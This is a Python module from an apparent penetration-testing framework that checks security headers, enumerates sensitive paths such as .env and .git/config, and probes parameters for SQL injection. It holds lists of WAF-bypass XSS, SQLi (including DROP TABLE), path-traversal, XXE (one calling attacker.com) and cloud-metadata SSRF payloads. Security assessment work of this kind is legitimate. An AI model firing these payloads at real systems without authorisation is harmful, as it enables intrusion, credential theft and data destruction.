"""
Web / WAF Module — XSS, SQLi, WAF bypass analysis
"""

import asyncio
import re
import aiohttp
import ssl as ssl_lib
from core.orchestrator import EngagementState, Finding, Severity


# WAF bypass payload sets per WAF type
WAF_BYPASS_PAYLOADS = {
    "Cloudflare": {
        "xss": [
            "<svg/onload=alert(1)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;49&#41;>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        ],
        "sqli": [
            "' OR 1=1--",
            "' /*!50000OR*/ 1=1--",
            "' OR 'x'='x",
            "1' /*!AND*/ 1=1--",
        ],
    },
    "ModSecurity": {
        "xss": [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
            "<<SCRIPT>alert(1)//<</SCRIPT>",
        ],
        "sqli": [
            "' OR 1=1 #",
            "admin'--",
            "' UNION SELECT null,null--",
        ],
    },
    "Generic": {
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><img src=x onerror=alert(document.domain)>",
            "<body onload=alert(1)>",
            "javascript:alert(1)",
        ],
        "sqli": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "1; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
        ],
        "lfi": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd%00",
        ],
        "xxe": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        ],
        "ssrf": [
            "http://127.0.0.1:80",
            "http://localhost/admin",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]:80",
            "http://0.0.0.0:80",
        ],
    },
}

SENSITIVE_ENDPOINTS = [
    "/admin", "/admin/login", "/administrator", "/wp-admin",
    "/.env", "/.git/config", "/config.php", "/config.yml",
    "/backup.zip", "/backup.sql", "/db.sql",
    "/api/v1/users", "/api/users", "/api/admin",
    "/phpmyadmin", "/phpinfo.php",
    "/actuator", "/actuator/env", "/actuator/health",
    "/console", "/h2-console",
    "/.htpasswd", "/.htaccess",
    "/web.config", "/appsettings.json",
    "/robots.txt", "/sitemap.xml",
    "/.well-known/security.txt",
]

SECURITY_HEADERS = {
    "X-Frame-Options": "Clickjacking protection",
    "Content-Security-Policy": "XSS/injection policy",
    "X-XSS-Protection": "Browser XSS filter",
    "X-Content-Type-Options": "MIME sniffing protection",
    "Strict-Transport-Security": "HTTPS enforcement",
    "Referrer-Policy": "Referrer info control",
    "Permissions-Policy": "Feature policy",
}


async def check_endpoint(session, base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with session.get(url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            return {
                "url": url,
                "status": resp.status,
                "size": resp.headers.get("Content-Length", "?"),
                "interesting": resp.status in (200, 301, 302, 403, 401),
            }
    except Exception:
        return {"url": url, "status": 0, "interesting": False}


async def check_security_headers(session, url: str) -> dict:
    missing = []
    present = []
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            headers = {k.lower(): v for k, v in resp.headers.items()}
            for h, desc in SECURITY_HEADERS.items():
                if h.lower() in headers:
                    present.append(h)
                else:
                    missing.append({"header": h, "description": desc})
    except Exception as e:
        return {"error": str(e), "missing": [], "present": []}
    return {"missing": missing, "present": present}


async def test_basic_sqli(session, url: str) -> list:
    findings = []
    error_patterns = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
        r"valid MySQL result", r"check the manual that corresponds",
        r"ORA-\d{5}", r"Oracle.*error", r"PLS-\d{5}",
        r"Unclosed quotation mark", r"Microsoft OLE DB Provider for ODBC",
        r"ADODB\.Field error", r"SQLServer JDBC Driver",
        r"PostgreSQL.*ERROR", r"psycopg2",
    ]

    payloads = ["'", "''", "' OR '1'='1", "1' AND SLEEP(1)--"]
    params_to_test = ["id", "user", "username", "search", "q", "name", "page"]

    for param in params_to_test[:3]:  # limit for speed
        for payload in payloads[:2]:
            test_url = f"{url}?{param}={payload}"
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    body = await resp.text(errors="ignore")
                    for pattern in error_patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append({
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "error_pattern": pattern,
                            })
                            break
            except Exception:
                pass

    return findings


async def run_web_analysis(state: EngagementState, console=None) -> dict:
    recon = state.recon_data
    web_results = recon.get("web", {})

    if not web_results:
        state.add_note("No web services found, skipping web module")
        return {}

    def log(msg):
        if console:
            console.print(f"  [dim]→[/dim] {msg}")

    def _add(finding):
        if not any(x.title == finding.title for x in state.findings):
            state.add_finding(finding)

    ssl_ctx = ssl_lib.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl_lib.CERT_NONE

    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    web_data = {}

    async with aiohttp.ClientSession(
        connector=connector,
        headers={"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}
    ) as session:

        for port, winfo in web_results.items():
            base_url = winfo.get("url", "")
            if not base_url:
                continue

            port_data = {
                "base_url": base_url,
                "technologies": winfo.get("technologies", []),
                "waf": winfo.get("waf"),
                "security_headers": {},
                "endpoints": [],
                "sqli_findings": [],
                "waf_payloads": {},
            }

            # Security headers
            log(f"Checking security headers: {base_url}")
            port_data["security_headers"] = await check_security_headers(session, base_url)

            missing_hdrs = port_data["security_headers"].get("missing", [])
            if len(missing_hdrs) >= 3:
                _add(Finding(
                    title=f"Missing security headers ({len(missing_hdrs)}) on {base_url}",
                    severity=Severity.MEDIUM,
                    description=f"Missing: {', '.join(h['header'] for h in missing_hdrs[:5])}",
                    evidence=f"Headers not present in HTTP response",
                    mitre_tactic="Initial Access",
                    mitre_technique="T1190 - Exploit Public-Facing Application",
                    remediation="Add missing security headers in web server config.",
                    phase="web",
                ))

            # Endpoint enumeration
            log(f"Endpoint enumeration ({len(SENSITIVE_ENDPOINTS)} paths)...")
            tasks = [check_endpoint(session, base_url, ep) for ep in SENSITIVE_ENDPOINTS]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            found_endpoints = [r for r in results if isinstance(r, dict) and r.get("interesting") and r.get("status", 0) != 404]
            port_data["endpoints"] = found_endpoints

            for ep in found_endpoints:
                if ep.get("status") == 200:
                    path = ep["url"].replace(base_url, "")
                    sev = Severity.CRITICAL if any(x in path for x in [".env", ".git", "backup", "db.sql"]) else Severity.HIGH
                    _add(Finding(
                        title=f"Sensitive endpoint exposed: {path}",
                        severity=sev,
                        description=f"Sensitive path accessible: {ep['url']}",
                        evidence=f"HTTP {ep['status']} response",
                        mitre_tactic="Discovery",
                        mitre_technique="T1083 - File and Directory Discovery",
                        remediation="Restrict access or remove sensitive files from web root.",
                        phase="web",
                    ))

            # Basic SQLi test
            log(f"Basic SQLi probe...")
            port_data["sqli_findings"] = await test_basic_sqli(session, base_url)
            for sqli in port_data["sqli_findings"]:
                _add(Finding(
                    title=f"Possible SQL injection: {sqli['param']} parameter",
                    severity=Severity.CRITICAL,
                    description=f"SQL error triggered at {sqli['url']}",
                    evidence=f"Payload: {sqli['payload']} | Pattern: {sqli['error_pattern']}",
                    mitre_tactic="Initial Access",
                    mitre_technique="T1190 - Exploit Public-Facing Application",
                    remediation="Use parameterized queries / prepared statements.",
                    cvss=9.8,
                    phase="web",
                ))

            # WAF bypass payloads suggestion
            waf = winfo.get("waf") or "Generic"
            payloads_key = waf if waf in WAF_BYPASS_PAYLOADS else "Generic"
            port_data["waf_payloads"] = WAF_BYPASS_PAYLOADS[payloads_key]

            web_data[str(port)] = port_data

    state.web_data = web_data
    state.add_note(f"Web analysis complete on {len(web_data)} ports")
    return web_data
